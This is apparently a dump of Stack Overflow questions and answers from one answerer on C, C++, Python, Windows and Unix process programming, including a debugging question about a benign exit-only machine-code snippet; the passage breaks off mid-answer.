"<p>I have Django running on a standard WSGI/Apache httpd combo.</p>

<p>I noticed that file output was different when I ran code in the shell vs. from the browser. I've isolated out everything else and am still getting the same problem.</p>

<p>Here's the code:</p>

<pre><code>def test_antiword(filename):
    import subprocess
    with open(filename, 'w') as writefile:
        subprocess.Popen([""antiword"", '/tmp/test.doc'], stdout=writefile)
    p = subprocess.Popen([""antiword"", '/tmp/test.doc'], stdout=subprocess.PIPE)
    out, _ = p.communicate()
    ords = []
    for kk in out:
        ords.append(ord(kk))
    return out, ords

def test_antiword_view(request):
    import HttpResponse
    return HttpResponse(repr(test_antiword('/tmp/web.txt')))
</code></pre>

<p>When open the url in the browser, this is the output:</p>

<blockquote>
  <p>('\n""I said good day sir. Good day!"" shouted Sh\xe9rlo\xe7k H\xf8lme\xa3.\n\n ""Why not Zoidberg?"" queried Zoidberg.\n', [10, 34, 73, 32, 115, 97, 105, 100, 32, 103, 111, 111, 100, 32, 100, 97, 121, 32, 115, 105, 114, 46, 32, 71, 111, 111, 100, 32, 100, 97, 121, 33, 34, 32, 115, 104, 111, 117, 116, 101, 100, 32, 83, 104, 233, 114, 108, 111, 231, 107, 32, 72, 248, 108, 109, 101, 163, 46, 10, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 34, 87, 104, 121, 32, 110, 111, 116, 32, 90, 111, 105, 100, 98, 101, 114, 103, 63, 34, 32, 113, 117, 101, 114, 105, 101, 100, 32, 90, 111, 105, 100, 98, 101, 114, 103, 46, 10])</p>
</blockquote>

<p>This is the corresponding output when I call <code>test_antiword('/tmp/shell.txt')</code> ine hte shell:</p>

<blockquote>
  <p>('\n\xe2\x80\x9cI said good day sir. Good day!\xe2\x80\x9d shouted Sh\xc3\xa9rlo\xc3\xa7k H\xc3\xb8lme\xc2\xa3.\n\n             \xe2\x80\x9cWhy not Zoidberg?\xe2\x80\x9d queried Zoidberg.\n', [10, 226, 128, 156, 73, 32, 115, 97, 105, 100, 32, 103, 111, 111, 100, 32, 100, 97, 121, 32, 115, 105, 114, 46, 32, 71, 111, 111, 100, 32, 100, 97, 121, 33, 226, 128, 157, 32, 115, 104, 111, 117, 116, 101, 100, 32, 83, 104, 195, 169, 114, 108, 111, 195, 167, 107, 32, 72, 195, 184, 108, 109, 101, 194, 163, 46, 10, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 226, 128, 156, 87, 104, 121, 32, 110, 111, 116, 32, 90, 111, 105, 100, 98, 101, 114, 103, 63, 226, 128, 157, 32, 113, 117, 101, 114, 105, 101, 100, 32, 90, 111, 105, 100, 98, 101, 114, 103, 46, 10])</p>
</blockquote>

<p>As you can see, the output is very different. For one thing, the shell output maintains the whitespace that was in the original file; it's lost in the web version.</p>

<p>As you can see in the code, I also output the documents to files. The generated output is below:</p>

<p><strong>web.txt</strong></p>

<pre><code>""I said good day sir. Good day!"" shouted Sh?rlo?k H?lme?.

             ""Why not Zoidberg?"" queried Zoidberg.
</code></pre>

<p><strong>shell.txt</strong></p>

<pre><code>“I said good day sir. Good day!” shouted Shérloçk Hølme£.

             “Why not Zoidberg?” queried Zoidberg.
</code></pre>

<p>In the web version, the characters are unrecognized and the encoding is identified by <code>file</code> as ISO-8859. In the shell version, the characters display correctly and the encoding is identified by <code>file</code> as UTF-8.</p>

<p>I am at a loss to why this could be happening. I've checked and both processes are using the same version of antiword. In addition, I've verified that they are both using the same python module file for <code>subprocess</code>. The version of Python being used in both cases matches exactly also.</p>

<p>Can anyone explain what might be going on?</p>
","9530","","<p>The difference is likely due to an environment variable.  According to the <a href=""http://linux.die.net/man/1/antiword"" rel=""nofollow"">man page</a>:</p>

<blockquote>
  <p>Antiword uses the environment variables <code>LC_ALL</code>, <code>LC_CTYPE</code> and <code>LANG</code> (in that order) to get the current locale and uses this information to select the default mapping file. </p>
</blockquote>

<p>I suspect that what's happening is that when you run it from your shell, your shell is in a UTF-8 locale, but when you run it from Django, it's in a different locale, and it can't properly convert the Unicode characters.  Try switching into a UTF-8 locale when running the subprocess like this:</p>

<pre><code>new_env = dict(os.environ)  # Copy current environment
new_env['LANG'] = 'en_US.UTF-8'
p = subprocess.Popen(..., env=new_env)
</code></pre>
"
"<p>Is it acceptable/safe in Objective-C/Cocoa to wrapping the <code>init</code> method as follows:</p>

<pre><code>-(id)init {
    if ((self=[super init])) {
         self.bar = [[Bar alloc] init];
    }
    return self;
}

-(id)initWithFoo:(Foo *)f {
    if ((self=[self init])) {
         self.foo = f;
    }
    return self;
}
</code></pre>

<p><strong>Note the <code>[self init]</code> in <code>initWithFoo</code>.</strong></p>

<p><em>perhaps this is a simple yes answer... seem obvious, but not standard?</em></p>
","9530","","<p>It's certainly acceptable and safe.  I'm not certain if it's standard practice, but I don't think it's bad practice.</p>

<p><strong>Note:</strong> This is not <em>overloading</em>.  Overloading refers to a very specific thing in C-like languages (particularly C++) where you have multiple functions with the same name, distinguished only by their numbers and/or types of parameters.  A better term for this would probably be something like <em>forwarding</em> or <em>wrapping</em>.</p>
"
"<p>I'm trying to start a user-mode process from a service using CreateProcessAsUser() API similar to <a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/aa379608%28v=vs.85%29.aspx"" rel=""nofollow"">this code</a>. My code works fine in 99% of the time, except at times that API succeeds, I get the process handle from the <a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/ms684873%28v=vs.85%29.aspx"" rel=""nofollow"">PROCESS_INFORMATION</a> struct but the process itself doesn't appear in the interactive user session that I was intending it to run in.</p>

<p>The interesting thing is that if I call <a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/ms683189%28v=vs.85%29.aspx"" rel=""nofollow"">GetExitCodeProcess</a>() on the process handle it succeeds with return code 0xC0000142. Any idea why?</p>
","9530","","<p>Error 0xC0000142 is <code>STATUS_DLL_INIT_FAILED</code> (I determined this using the <a href=""http://www.microsoft.com/en-us/download/details.aspx?id=985"" rel=""nofollow"">Error Code Lookup Tool</a>).  A quick google found <a href=""http://ask.electric-cloud.com/questions/606/why-do-i-get-status_dll_init_failed-from-a-program-run-on-the-agent"" rel=""nofollow"">this question</a>, which says:</p>

<blockquote>
  <p>The most common cause of this problem is that a program that links to <code>user32.dll</code> was run in a context in which it could not talk to the system's window station and desktop. Normally, a service such as the agent runs in its own window station and desktop, and user32 programs run fine, but any program that displayed a dialog box would then hang without any opportunity for a human being to see the error message or close the dialog.</p>
</blockquote>

<p>So, if you're not using any functions from <code>user32.dll</code>, you should remove that dependency.  If you are using that DLL, then I'm not really sure what you're supposed to do.  One option would be to load the DLL dynamically with <code>LoadLibrary</code> and use it if it succeeds (i.e. you have a valid window session) or to fallback on a failure mode if it fails.</p>
"
"<p>I have 2 dictionaries.</p>

<pre><code>dict1={('SAN RAMON', 'CA'): 1, ('UPLAND', 'CA'): 4, ('POUGHKEESIE', 'NY'): 3, ('CATTANOOGA', 'TN'): 1}

dict2={('UPLAND', 'CA'): 5223, ('PORT WASHING', 'WI'): 11174, ('PORT CLINTON', 'OH'): 6135, ('GRAIN VALLEY', 'MO'): 10352, ('GRAND JUNCTI', 'CO'): 49688, ('FAIRFIELD', 'IL'): 5165}
</code></pre>

<p>These are just samples, in reality each dict has hundreds of entries. I am trying to merge the two dictionaries and create dict 3 that contains {dict1.values(): dict2.values()} but only if that city appears in both dicts. So, one entry in dict3 would look like</p>

<pre><code>{4:5223}   # for 'UPLAND', 'CA' since it appears in both dict1 and dict2
</code></pre>

<p>This is just a small step in a larger function I am writing. I was going to try something like :</p>

<pre><code>for item in dict1.keys():
        if item not in dict2.keys():
            del item
        return dict[(dict1.keys())=(dict2.keys())]
</code></pre>

<p>I can't figure out how to make sure the number of complaints from dict1 matches the same city it is being referred to in dict2.</p>
","9530","","<p>The straightforward way would be to check each key in one for membership in the other:</p>

<pre><code>result = {}
for key in dict1:
    if key in dict2:
        result[dict1[key]] = dict2[key]
</code></pre>

<p>You could also try converting them into a <code>set</code> or <code>frozenset</code> and taking their intersection, but it's not clear to me whether that will be faster or not:</p>

<pre><code>keys_in_both = frozenset(dict1) &amp; frozenset(dict2)
result = dict((dict1[key], dict2[key]) for key in keys_in_both)
</code></pre>
"
"<p>Why do Visual Studio 2010 and Visual Studio 2012 fail to compile this code?</p>

<p>Codepad.org, Xcode, gcc, LLVM, Clang all have no problem but Visual Studio poops the bed:</p>

<pre><code>struct S {
  template &lt;class T&gt; inline operator T () const { return T (); }
};
int main () {
  // NOTE: ""S()"" denotes construction in these examples
  struct F {
    void operator() (bool) { }
    static void toint (int) { }
    static void tostr (char const*) { }
  };
  bool b1 = S (); // Okay
  bool b2 (S ()); // Okay
  F () (S ());    // Okay
  F::toint (S ());// Okay
  F::tostr (S ());// Okay

  S () || false;  // Error: error C2676: binary '||' : 'vf::S' does
                  // not define this operator or a conversion to a type
                  // acceptable to the predefined operator
  return 0;
}
</code></pre>

<p>Adding the <code>explicit</code> keyword doesn't change a thing for gcc or clang. The error message produced is:</p>

<pre><code>error C2676: binary '||' : 'S' does not define this operator or a
  conversion to a type acceptable to the predefined operator
</code></pre>
","9530","","<p>It's a bug, at least in C++03 (not sure about C++11).</p>

<p>According to the overload resolution rules in C++03 §13.3.1.2, the built-in <code>||</code> operator is selected, since no user-defined <code>||</code> operator is defined for <code>S</code>.</p>

<p>§5.15/1 says:</p>

<blockquote>
  <p>The <code>||</code> operator groups left-to-right. The operands are both implicitly converted to <code>bool</code> (clause 4). [...]</p>
</blockquote>

<p>§12.3/2 says:</p>

<blockquote>
  <p>User-defined conversions are applied only where they are unambiguous (10.2, 12.3.2). [...]</p>
</blockquote>

<p>§12.3/5:</p>

<blockquote>
  <p>User-defined conversions are used implicitly only if they are unambiguous.  [...] Function overload resolution (13.3.3) selects the best conversion function to perform the conversion.</p>
</blockquote>

<p>§13.3.2/3:</p>

<blockquote>
  <p>Second, for <code>F</code> to be a viable function, there shall exist for each argument an implicit conversion sequence (13.3.3.1) that converts that argument to the corresponding parameter of <code>F</code>.</p>
</blockquote>

<p>Clearly <code>S</code> defines a user-defined conversion to <code>bool</code>.  The built-in <code>||</code> operator is a viable function for the overload resolution, and since it's the only one, it's the best.  So the expression is well-formed.</p>

<p>Also of note is §4/3, which says:</p>

<blockquote>
  <p>An expression <code>e</code> can be implicitly converted to a type <code>T</code> if and only if the declaration “<code>T t=e;</code>” is well- formed, for some invented temporary variable <code>t</code> (8.5). [...]</p>
</blockquote>

<p>So I'm curious whether Visual Studio also produces an error for the statement <code>bool b = S();</code>.</p>
"
"<pre><code>#include&lt;iostream.h&gt;
int main()
{
   char name[] = ""Mary Mon"";
   cout&lt;&lt;strlen(name);
   return 0;
}
</code></pre>

<p>This program compiles normally without <code>#include&lt;string.h&gt;</code>. Why?</p>
","9530","","<p>Firstly, as pointed out in the comments, there is no standard header file named <code>&lt;iostream.h&gt;</code>.  <code>iostream.h</code> was a header file used before the C++ language was standardized in 1998.  When the standard was published, the name was changed to just <code>&lt;iostream&gt;</code> (without the <code>.h</code>).</p>

<p>Secondly, the standard allows headers to include other headers (C++03 §17.4.4.1/1).  So it might happen that your <code>&lt;iostream.h&gt;</code> header includes <code>&lt;string.h&gt;</code>, probably because some of the template code there relies on some string function.  As a result, your code compiles cleanly.</p>

<p>Nevertheless, you should not rely on this behavior.  In order for your code to be most portable, you should <code>#include</code> every header file you need, whether or not they are <code>#include</code>d recursively by some other header file.</p>
"
"<p>I'm doing a project using the Microchip C18 compiler. I have a struct called a block that points to other blocks (north east south west). These blocks will make me a map.
I then have a pointer that I use to evaluate everything.</p>

<p>Just using RAM it looks like:</p>

<pre><code>struct block{
        struct block *north;
        struct block *east;
        struct block *south;
        struct block *west;
};


struct block map[5] =
{ // just a simple line.
        { NULL, &amp;map[1], NULL, NULL },
        { NULL, &amp;map[2], NULL, &amp;map[0]},
        { NULL, &amp;map[3], NULL, &amp;map[2]},
        { NULL, &amp;map[4], NULL, &amp;map[3]},
        { NULL, NULL, NULL, &amp;map[4]}
};


struct block* position = &amp;map[0];
</code></pre>

<p>This lets me do stuff like:</p>

<pre><code>void goWest()
{
if(position -&gt; west != NULL) position = position -&gt; west;
}
</code></pre>

<p>Problem is that I've run out of RAM in my project and need to use ROM
What I have so far is:</p>

<pre><code>struct block{
        rom struct block *north;
        rom struct block *east;
        rom struct block *south;
        rom struct block *west;
};
rom struct block map[5] =
{ // just a simple line.
        { NULL, &amp;map[1], NULL, NULL },
        { NULL, &amp;map[2], NULL, &amp;map[0]},
        { NULL, &amp;map[3], NULL, &amp;map[2]},
        { NULL, &amp;map[4], NULL, &amp;map[3]},
        { NULL, NULL, NULL, &amp;map[4]}
};
</code></pre>

<p>I've done some debugging and can tell the above part works, but trying to make the position pointer is giving me grief.
so I guess my question is:</p>

<p>How do I hold the ROM variable addresses in a pointer which I can edit the values of?</p>

<p>When i try:</p>

<pre><code>struct block *position = &amp;map[0];
</code></pre>

<p>I get ""Warning [2066] type qualifier mismatch in assignment""</p>

<p>I realize that a ROM variable and RAM variable are two different things,
but I have no idea what to do.</p>
","9530","","<p>What is the definition of the <code>rom</code> macro?  I'm guessing that it expands to <code>const</code> (and possibly a compiler-specific <code>__attribute__</code> or somesuch), because the compiler is complaining about a ""type qualifier mismatch"", which refers to a <code>const</code> or <code>volatile</code> mismatch.</p>

<p>What that means is that you're trying to implicitly cast a pointer to constant data into a pointer to non-constant data.  This code should generate the same warning with your compiler:</p>

<pre><code>const int x = 0;
int *y = &amp;x;  // &amp;x is ""pointer to const"" but y is ""pointer to non-const""
</code></pre>

<p>To fix it, you need to declare that your <code>position</code> pointer is a pointer to constant data (which, depending on the definition of the <code>rom</code> macro, should be done with either <code>rom</code> or the <code>const</code> qualifier):</p>

<pre><code>// Declare a non-constant pointer to constant data
const struct block *position = &amp;map[0];
</code></pre>

<p>At each pointer level, you can have a <code>const</code> qualifier or lack thereof, and likewise for the base non-pointer object.  So, a single-level pointer can have 4 different variants:</p>

<pre><code>int *x;  // Non-constant pointer to non-constant data
int *const x;  // Constant pointer to non-constant data
const int *x;  // Non-constant pointer to constant data
int const *x;  // Same as above
const int *const x;  // Constant pointer to constant data
int const *const x;  // Same as above
</code></pre>

<p>Note that <code>int const</code> and <code>const int</code> are equivalent, but otherwise the placement of <code>const</code> <em>does</em> matter.</p>
"
"<p>I'm trying to set up a new Windows Forms Application (C++/CLI) in Visual Studio 2010 on Windows 7.  Every time I try to open up the Designer, it fails with this unhelpful error:</p>

<pre><code>Exception from HRESULT: 0x8CE00001

Instances of this error (1)  

1.   Hide Call Stack 

at Microsoft.VisualStudio.Designer.Interfaces.IVSMDCodeDomProvider.get_CodeDomProvider()
at Microsoft.VisualStudio.Shell.Design.Serialization.CodeDom.CodeDomDocDataAdapter.get_Provider()
at Microsoft.VisualStudio.Shell.Design.Serialization.CodeDom.CodeDomDocDataAdapter.get_CompileUnit()
at Microsoft.VisualStudio.Design.Serialization.CodeDom.VSCodeDomDesignerLoader.PerformLoad(IDesignerSerializationManager serializationManager)
at Microsoft.VisualStudio.Design.Serialization.CodeDom.VSCodeDomDesignerLoader.DeferredLoadHandler.Microsoft.VisualStudio.TextManager.Interop.IVsTextBufferDataEvents.OnLoadCompleted(Int32 fReload) 
</code></pre>

<p>If I debug Visual Studio and break on CLR exceptions, it actually throws this exception first:</p>

<blockquote>
  <p>A first chance exception of type 'System.ArgumentException' occurred in Microsoft.VisualStudio.Design.dll</p>
  
  <p>Additional information: The parameter is incorrect. (Exception from HRESULT: 0x80070057 (E_INVALIDARG))</p>
</blockquote>

<p>With this call stack:</p>

<pre><code>&gt;   Microsoft.VisualStudio.Design.dll!Microsoft.VisualStudio.Design.Serialization.CodeDom.VSCodeDomDesignerLoader.VerifyNestedDocDataCompatible() + 0x15d bytes 
    Microsoft.VisualStudio.Design.dll!Microsoft.VisualStudio.Design.Serialization.CodeDom.VSCodeDomDesignerLoader.Microsoft.VisualStudio.Designer.Interfaces.IVSMDDesignerLoader.Initialize(object pSp, object pHier, int itemid, object punkDocData) + 0xb5 bytes  
    [Native to Managed Transition]  
    vcpkg.dll!CVCFormEditorFactory::CreateEditorInstance()  + 0x2e49f bytes 
    msenv.dll!CVsUIShellOpenDocument::OpenSpecificEditor()  + 0x784 bytes   
    VCProject.dll!CVCFileNode::OpenSpecificEditor()  + 0xc6 bytes   
    VCProject.dll!CVCFileNode::OpenSpecificEditor()  + 0x3a bytes   
    VCProject.dll!CVCFileNode::DoOpenFile()  + 0x1fe bytes  
    VCProject.dll!CVCFileNode::DoDefaultAction()  + 0x5b bytes  
    VCProject.dll!CVCArchy::ExecCommand()  + 0x8c bytes 
    msenv.dll!CVsUIHierarchyBaseWin::ExecHierParentChain()  + 0x85 bytes    
    msenv.dll!CVsUIHierarchyBaseWin::WinExecCommand()  + 0x7d bytes 
    msenv.dll!CVsUIHierarchyBaseWin::ProcessLButtonDblClkMsg()  + 0xd8 bytes    
    msenv.dll!FnwpTVFixer()  + 0x76b49 bytes    
    user32.dll!_InternalCallWinProc@20()  + 0x23 bytes  
    user32.dll!_UserCallWinProcCheckWow@32()  + 0xb7 bytes  
    user32.dll!_DispatchMessageWorker@8()  + 0xed bytes 
    user32.dll!_DispatchMessageW@4()  + 0xf bytes   
    msenv.dll!ProcessMessage()  + 0x4d bytes    
    msenv.dll!CMsoCMHandler::EnvironmentMsgLoop()  + 0x87 bytes 
    msenv.dll!CMsoCMHandler::FPushMessageLoop()  + 0x79 bytes   
    msenv.dll!SCM::FPushMessageLoop()  + 0x8c bytes 
    msenv.dll!SCM_MsoCompMgr::FPushMessageLoop()  + 0x2a bytes  
    msenv.dll!CMsoComponent::PushMsgLoop()  + 0x28 bytes    
    msenv.dll!VStudioMainLogged()  + 0x22a bytes    
    msenv.dll!_VStudioMain()  + 0x78 bytes  
    devenv.exe!util_CallVsMain()  + 0xdb bytes  
    devenv.exe!CDevEnvAppId::Run()  + 0x693 bytes   
    devenv.exe!_WinMain@16()  + 0x9c bytes  
    devenv.exe!operator new[]()  + 0xb31c bytes 
    kernel32.dll!@BaseThreadInitThunk@12()  + 0x12 bytes    
    ntdll.dll!___RtlUserThreadStart@8()  + 0x27 bytes   
    ntdll.dll!__RtlUserThreadStart@8()  + 0x1b bytes    
</code></pre>

<p>This is with a clean, new project (<strong>File → New → Project... → Visual C++ → CLR → Windows Forms Application</strong>).  After I create a new project, opening up the autogenerated <code>Form1.h</code> results in the error instead of the Designer.  However, if I create a C# Windows Forms Application instead of C++/CLI, it works fine.</p>

<p>Any ideas on how I can solve this problem and open up the Designer?  I've tried all of the following to no avail:</p>

<ul>
<li>Reinstalling <a href=""http://www.microsoft.com/downloads/en/details.aspx?FamilyID=75568aa6-8107-475d-948a-ef22627e57a5&amp;displaylang=en"" rel=""nofollow"">VS 2010 SP1</a></li>
<li>Running Windows Update, which installed two VS-related updates (""Update for Microsoft Visual Studio 2010 Service Pack 1 (KB2736182)"" and ""Update for Microsoft Visual Studio 2010 Tools for Office Runtime (KB2764593)"")</li>
<li>Installing <a href=""http://www.microsoft.com/en-us/download/details.aspx?id=27130"" rel=""nofollow"">KB2635973</a>, which fixes a similar-looking issue</li>
<li>Rebooting after installing the above</li>
<li>Turning off all DirectX debugging/validation settings in the DirectX Control Panel</li>
<li>Uninstalling anything with ""Microsoft SQL Server Compact"" in its name via the ""Program and Features"" control panel</li>
</ul>

<p>I've found a few similar threads online (<a href=""http://connect.microsoft.com/VisualStudio/feedback/details/684190/windows-forms-designer-fails-to-load-for-c-cli-project-error-0x8ce00001"" rel=""nofollow"">one</a>, <a href=""http://social.msdn.microsoft.com/Forums/en-US/vcprerelease/thread/67d65d8d-db42-430f-aeb7-40925cb0c0c8"" rel=""nofollow"">two</a>, <a href=""http://social.msdn.microsoft.com/Forums/en/vcgeneral/thread/51f26bc6-1e7d-4e34-8b0e-853b48aa1749"" rel=""nofollow"">three</a>), but they've all been inconclusive or not worked for me.  I've not yet tried fully reinstalling Visual Studio, but I may have to try that next.</p>
","9530","","<p>After much nuking and reinstalling, I believe this to have been a problem with a Visual Studio Extension.</p>

<p>Completely uninstalling Visual Studio (even with <a href=""http://archive.msdn.microsoft.com/vs2010uninstall"" rel=""nofollow""><code>VS2010_Uninstall-RTM.ENU.exe /full /netfx</code></a>) and reinstalling it didn't help.  But, if I created a new Windows user, it worked fine for that user.  Similarly, if I nuked my <code>HKEY_CURRENT_USER\Software\Microsoft\VisualStudio\10.0</code> and <code>HKEY_CURRENT_USER\Software\Microsoft\VisualStudio\10.0_Config</code> registry keys (and their subkeys), it worked.</p>

<p>After painstakingly comparing my old registry (where it gave the error) with a fresh registry (where it worked) and reconciling them, the only differences that remained were related to a particular VS extension.  Since I no longer need that extension, I don't need its registry keys, so without them, the Designer is working as expected.</p>
"
"<p>I've a problem with exec() function under ubuntu.
Is there any possibility to go back to the main program?</p>

<p>example:</p>

<pre><code>printf(""Some instructions at beginning\n"");
execlp(""ls"",""ls"", ""-l"", NULL);

// i want to continue this program after exec and see the text below
printf(""Other instructions\n"");
</code></pre>
","9530","","<p>No.  A successful <code>exec</code> call <em>replaces</em> the current program with another program.  If you want both the parent and child to stick around, you need to call <a href=""http://linux.die.net/man/2/fork"" rel=""nofollow""><code>fork(2)</code></a> before <code>exec</code>:</p>

<pre><code>pid_t childpid = fork();
if(childpid &lt; 0)
{
    // Handle error
}
else if(childpid == 0)
{
    // We are the child
    exec(...);
}
else
{
    // We are the parent: interact with the child, wait for it, etc.
}
</code></pre>

<p>Note that a failed <code>exec</code> call (e.g. the given executable doesn't exist) does return.  If <code>exec</code> returns, it's always because of an error, so be prepared to handle the error.</p>
"
"<p>We are using a korean font and freetype library and trying to display a korean character. But it displays some other characters indtead of hieroglyph
Code:</p>

<pre><code>std::wstring text3 = L""놈"";
</code></pre>

<p>Is there any tricks to type the korean characters?</p>
","9530","","<p>For maximum portability, I'd suggest avoiding encoding Unicode characters directly in your source code and using <code>\u</code> escape sequences instead.  The character 놈 is Unicode code point U+B188, so you could write this as:</p>

<pre><code>std::wstring text3 = L""\uB188"";
</code></pre>
"
"<p>Installing a new Windows system, I've installed CygWin and 64
bit Python (2.7.3) in their default locations (<code>c:\cygwin</code> and
<code>c:\Python27\python</code>), and added both the CygWin bin and the
Python directory to my path (in the user variable PATH).  From
the normal command window, Python starts up perfectly, but when
I invoke it from <code>bash</code> in the CygWin environment, it hangs,
never giving my the input prompt.</p>

<p>I've done this on other machines, previously, but always with
older versions of Python (32 bits) and CygWin, and with Python
in a decidely non-standard location.  Has anyone else had this
problem, or could someone tell me what it might be due to? </p>
","9530","","<p>The problem is that due to the way that the Cygwin terminal (MinTTY) behaves, the native Windows build of Python doesn't realize that stdout is a terminal device -- it thinks it's a pipe, so it runs in non-interactive mode instead of interactive mode, and it fully buffers its output instead of line-buffering it.</p>

<p>The reason that this is new is likely because in your previous Cygwin installation, you didn't have MinTTY, and the terminal used was just the standard Windows terminal.</p>

<p>In order to fix this, you either need to run Python from a regular Windows terminal (<code>Cmd.exe</code>), or install the Cygwin version of Python instead of a native Windows build of Python.  The Cygwin version (installable as a package via Cygwin's <code>setup.exe</code>) understands Cygwin terminals and acts appropriately when run through MinTTY.</p>

<p>If the particular version of Python you want is not available as a Cygwin package, then you can also download the source code of Python and build it yourself under Cygwin.  You'll need a Cygwin compiler toolchain if you don't already have one (GCC), but then I believe it should compile with a standard <code>./configure &amp;&amp; make &amp;&amp; make install</code> command.</p>
"
"<p>Right now I'm writing a C program that must execute a child process. I'm not doing multiple child processes simultaneously or anything, so this is fairly straightforward. I am definitely executing the built-in shell programs (i.e. things like cat and echo) successfully, but I also need to be able to tell when one of these programs fails to execute successfully. I'm trying this with the following simplified code:</p>

<pre><code>int returnStatus; // The return status of the child process.
pid_t pid = fork();

if (pid == -1) // error with forking.
{
   // Not really important for this question.
}
else if (pid == 0) // We're in the child process.
{
   execvp(programName, programNameAndCommandsArray); // vars declared above fork().

   // If this code executes the execution has failed.
   exit(127); // This exit code was taken from a exec tutorial -- why 127?
}
else // We're in the parent process.
{
   wait(&amp;returnStatus); // Wait for the child process to exit.

   if (returnStatus == -1) // The child process execution failed.
   {
      // Log an error of execution.
   }
}
</code></pre>

<p>So for example, if I try to execute rm fileThatDoesntExist.txt, I would like to consider that a failure since the file didn't exist. How can I accomplish this? Also, while that execvp() call successfully executes built-in shell programs, it doesn't execute programs in the current directory of the executable (i.e. the program that this code is running inside of); Is there something else that I have to do in order to get it to run programs in the current directory?</p>

<p>Thanks!</p>
","9530","","<p><a href=""http://linux.die.net/man/2/wait"" rel=""nofollow""><code>wait(2)</code></a> gives you more than just the exit status of the child process.  In order to get the real exit status, you need to use the <code>WIFEXITED()</code> macro to test if the child exited normally (as opposed to abnormally via a signal etc.), and then use the <code>WEXITSTATUS()</code> macro to get the real exit status:</p>

<pre><code>wait(&amp;status);
if(WIFEXITED(status))
{
    if(WEXITSTATUS(status) == 0)
    {
        // Program succeeded
    }
    else
    {
        // Program failed but exited normally
    }
}
else
{
    // Program exited abnormally
}
</code></pre>

<p>In order for <code>execvp(3)</code> to run a program in the current directory, you either need to add the current directory to your <code>$PATH</code> environment (generally not a good idea), or pass it the full path, e.g. use <code>./myprogram</code> instead of just <code>myprogram</code>.</p>
"
"<p>There are <a href=""http://stackoverflow.com/questions/8932200/c-access-violation-reading-why"">other</a> questions about the same message, but I specifically seem to run into this when I try to execute a string of machine code that invokes certain functions. In my case I make a call to exit(0) which works fine when called as typical in C in the same program. If, however, as an exercise I set the EIP to the address of some machine code (you might call it ""shellcode""), e.g.</p>

<pre><code>const char code[] = 
""\x6A\x00""      // push        0""
""\xFF\x15\x00\x00\x00\x00""  //system call, 'read access violation':   call dword ptr [__imp__exit]
""\x5D""  //pop ebp    
""\xC3""; //ret
</code></pre>

<p>I will get the message ""Access violation reading location 0x00000000."". The ""\x6A\x00"" instruction will run, but the call to exit(0) will throw this exception.  </p>

<p>This is C compiled in VS2010 with /GS-, and also running the ""shellcode"" with execute rights, but is there still some sort of nonexecutable memory or stack protection going on? Why is this instruction causing an error?</p>

<pre><code>    int main() 
{ 

    void *exec = VirtualAlloc(0, sizeof(code), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(exec, code, sizeof(code));
//EIP = exec in debug-&gt;immediate
    exit(0);

}
</code></pre>
","9530","","<p>If you disassemble your shellcode, you'll get something like this (AT&amp;T syntax):</p>

<pre><code>00000000 &lt;_code&gt;:
   0:   6a 00                   push   $0x0
   2:   ff 15 00 00 00 00       call   *0x0
   8:   5d                      pop    %ebp
   9:   c3                      ret
</code></pre>

<p>The <code>call</code> instruction is doing a memory-indirect jump through address 0: it's loading the target from memory address 0 and jumping to that location.  Since memory address 0 is invalid (in rare exceptions it can be valid, but this is no exception), an access violation results.</p>

<p>Ordinarily, when you compile C code, the jumps to external functions get replaced by placeholders, and those placeholders get filled in by the linker at link time.  When you're generating shellcode at runtime, you don't have the assistance of the linker, so you have to do it yourself.  You need to figure out what your desired target address is and fill that in directly in the shellcode, possibly using some position-independent tricks if you don't know exactly what address the shellcode is going to execute at.</p>
"
"<p>I want to retrieve the folder of the current user document folder in cpp, so I use <code>SHGetFolderPath</code> and include <code>Shobjidl.h</code>.</p>

<p>As the result my code does not compile and the following output is generated:</p>

<pre><code>1&gt;C:\Program Files\Microsoft SDKs\Windows\v7.0A\include\shobjidl.h(8994): error C2143: syntax error : missing ')' before 'constant'
1&gt;C:\Program Files\Microsoft SDKs\Windows\v7.0A\include\shobjidl.h(8994): error C2143: syntax error : missing ';' before 'constant'
1&gt;C:\Program Files\Microsoft SDKs\Windows\v7.0A\include\shobjidl.h(8994): error C2059: syntax error : ')'
1&gt;C:\Program Files\Microsoft SDKs\Windows\v7.0A\include\shobjidl.h(8994): error C2238: unexpected token(s) preceding ';'
</code></pre>

<p>The code behind these errors is:</p>

<pre><code>        virtual HRESULT STDMETHODCALLTYPE GetInt32( 
            /* [in] */ __RPC__in REFPROPERTYKEY key,
            /* [out] */ __RPC__out int *pi) = 0; // &lt;- this line produces compile error
</code></pre>

<p>What's wrong? Thanks in advance.</p>

<p>I am using Win 7, VS2010 Express.</p>
","9530","","<p>The header file you need to include for that function is <code>Shlobj.h</code>, according to <a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/bb762181%28v=vs.85%29.aspx"" rel=""nofollow"">the documentation</a>, not <code>Shobjidl.h</code>.  I'd guess that <code>Shobjidl.h</code> is likely an internal header file and not meant to be included directly -- it probably depends on other header files already being included before it, which would fix the errors you're seeing.</p>
"
"<p>For debugging purposes, I would like to find a way how to automatically keep track of the changes of the variables involved in my design.</p>

<p>The result I would like to obtain is like the printf of the new value every time the variable is assigned, but without manually inserting all the printf.</p>

<p>What is the best way to do this?
Thanks</p>
","9530","","<p>Create a new class for the variables you want to monitor and define an appropriate <code>operator=</code> assignment operator method:</p>

<pre><code>template &lt;class T&gt;
class MonitoredVariable
{
public:
    MonitoredVariable() {}
    MonitoredVariable(const T&amp; value) : m_value(value) {}

    T operator T() const { return m_value; }

    const MonitoredVariable&amp; operator = (const T&amp; value)
    {
        printf(""Variable modified\n"");
        m_value = value;
        return *this;
    }
private:
    T m_value;
}
</code></pre>

<p>Example usage:</p>

<pre><code>MoniredVariable&lt;int&gt; x;
x = 42;  // Will print ""Variable modified""
</code></pre>

<p>Of course, for this to be useful, you'll have to include relevant information in the <code>operator=</code> implementation, and you'll also have to overload the other arithmetic assignment operators such as <code>+=</code>, <code>-=</code>, etc.</p>
"
"<p>Is there an example of a working timer that executes some function every x amount seconds using C.</p>

<p>I appreciate an example working code.</p>

<p>Thanks.</p>
","9530","","<p>You could spawn a new thread:</p>

<pre><code>void *threadproc(void *arg)
{
    while(!done)
    {
        sleep(delay_in_seconds);
